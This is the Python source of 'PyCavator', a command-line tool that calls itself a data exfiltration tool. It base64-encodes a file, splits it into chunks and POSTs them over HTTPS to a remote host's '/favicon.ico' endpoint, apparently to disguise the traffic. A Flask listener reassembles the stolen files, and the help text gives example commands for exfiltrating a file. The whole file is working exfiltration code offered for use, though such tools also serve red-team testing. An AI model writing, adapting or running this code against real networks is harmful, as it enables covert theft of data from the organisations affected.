import os
import sys
import argparse
import base64
import time
import requests
from flask import Flask, request, jsonify
import ssl
import urllib3
urllib3.disable_warnings(urllib3.exceptions.SubjectAltNameWarning)

banner = '''
###############################################################
#                                                             #
#              PyCavator - Data Exfiltration                  #
#                                                             #
#                 Created by: Kryptohaker                     #
#                                                             #
###############################################################
'''
print(banner)

# Send data function
def send_data_https(args):
    # Read data from input file
    with open(args.input_file, 'rb') as f:
        data = f.read()

    # Encode data as base64
    data = base64.b64encode(data)

    # Split data into multiple chunks
    chunk_size = 65000
    chunks = [data[i:i+chunk_size] for i in range(0, len(data), chunk_size)]

    # Send data using POST requests
    url = f"https://{args.dst_addr}:{args.port}/favicon.ico"
    headers = {'Authorization': f"Bearer {args.token}"}
    chunk_num = 1
    print(f"[+] Starting send data to {args.dst_addr}:{args.port}")
    for chunk in chunks:
        payload = {'filename': args.input_file, 'chunk': base64.b64encode(chunk).decode(), 'chunk_num': chunk_num, 'total_chunks': len(chunks)}
        # verify = False
        response = requests.post(url, headers=headers, json=payload, verify=args.ca_file)

        if response.status_code == 200:
            print(f"[+] Chunk {chunk_num} sent successfully to {args.dst_addr}:{args.port}")
        else:
            print(f"[-] Failed to send chunk {chunk_num}. Status code: {response.status_code}")

        chunk_num += 1

# Receive data function
def receive_data_https(args):
    app = Flask(__name__)
    received_chunks = {}
    src_addr = args.src_addr
    
    # Check if 'output' folder exists, create it if it doesn't
    output_folder = args.output_folder
    output_folder = 'output' if not output_folder else output_folder
    if not os.path.exists(output_folder):
        os.mkdir(output_folder)
        print(f"[+] Created {output_folder} folder.")    
    
    @app.route('/favicon.ico', methods=['POST'])
    def upload():
        # Check if the request has the correct authorization header
        if 'Authorization' not in request.headers or request.headers['Authorization'] != f"Bearer {args.token}":
            return jsonify({'error': 'Unauthorized'}), 401
        if request.remote_addr == src_addr:           
            # Extract data from the request
            data = request.json
            filename =  os.path.normpath(data['filename'].replace("\\", "/"))
            chunk = base64.b64decode(data['chunk'])
            chunk_num = data['chunk_num']
            total_chunks = data['total_chunks']

            # Save the received chunk
            if filename not in received_chunks:
                received_chunks[filename] = {}
            received_chunks[filename][chunk_num] = chunk

            # If all chunks are received, reconstruct and save the file
            if len(received_chunks[filename]) == total_chunks:
                with open(os.path.join(output_folder, os.path.basename(filename)), 'wb') as f:
                    for i in range(1, total_chunks+1):
                        f.write(base64.b64decode(received_chunks[filename][i]))
                print(f"[+] File {filename} reconstructed and saved as {os.path.join(output_folder, os.path.basename(filename))} from IP address {request.remote_addr}.")
        else:
            print(f"[-] Not expected traffic came from {request.remote_addr} but expected from {src_addr}.")    
               
        return jsonify({'result': 'success'})

    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain(args.cert_file, keyfile=args.key_file)

    app.run(host='0.0.0.0', port=args.port, ssl_context=context)

# Main function
def main():
    # Parse command line arguments
    parser = argparse.ArgumentParser(
        description='PyCavator - HTTPS Exfiltration Tool',
        epilog='''Examples:
  # Sender mode: exfiltrate data from a file
  python pycavator-https.py -f input.txt -d 192.168.1.101 -p 4443 -ca ca.pem -t "eyJhbGciO..."
  
  # Listener mode: listen for incoming data and save to a single file
  python pycavator-https.py -l -s 192.168.1.100 -p 4443 -pb cert.pem -pk key.pem -o /tmp -t "eyJhbGciO..."
        ''',
        formatter_class=argparse.RawTextHelpFormatter
    )
    
    parser.add_argument('-l', '--listen', action='store_true', help='Listen for incoming data')
    parser.add_argument('-f','--input_file', metavar='FILE', help='Input file path')
    parser.add_argument('-d','--dst_addr', metavar='ADDRESS', help='Destination address')
    parser.add_argument('-s', '--src_addr', metavar='ADDRESS', help='source IP address to listen for (required in listener mode)')    
    parser.add_argument('-p','--port', metavar='PORT', type=int, help='Port number')
    parser.add_argument('-t','--token', metavar='TOKEN', type=str, help='Authorization token')
    parser.add_argument('-o', '--output_folder', metavar='FOLDER', type=str, default='./output', help='Output folder for the received files (default: "./output")')
    parser.add_argument('-pk','--key_file', metavar='KEY', type=str, help='Path to private key file for SSL/TLS encryption (required in listener mode)')
    parser.add_argument('-pb','--cert_file', metavar='CERT', type=str, help='Path to public key certificate file for SSL/TLS encryption (required in listener mode)')
    parser.add_argument('-ca', '--ca_file', metavar='CA', type=str, help='Path to CA (Certificate Authority) file used for SSL/TLS certificate verification (required in sender mode)')
    args = parser.parse_args()

    # Check if no arguments were provided    
    if len(sys.argv) == 1:
        parser.print_help(sys.stderr)
        exit(1)

    if args.listen:
        if not args.src_addr or not args.token or not args.port or not args.key_file or not args.cert_file:
            print("Missing required arguments for listener mode. Please provide source address (-s), authorization token (-t), listening port (-p), path to private (-pk) and public key (-pb) certificate file.")
            exit()
        receive_data_https(args)
    else:
        if not args.input_file or not args.dst_addr or not args.port or not args.token or not args.ca_file:
            print("Missing required arguments for sender mode. Please provide input file (-f), destination address (-d), authorization token (-t), destination port (-p) and path to CA (-ca) file.")
            exit()
        send_data_https(args)        

if __name__ == '__main__':
    main()    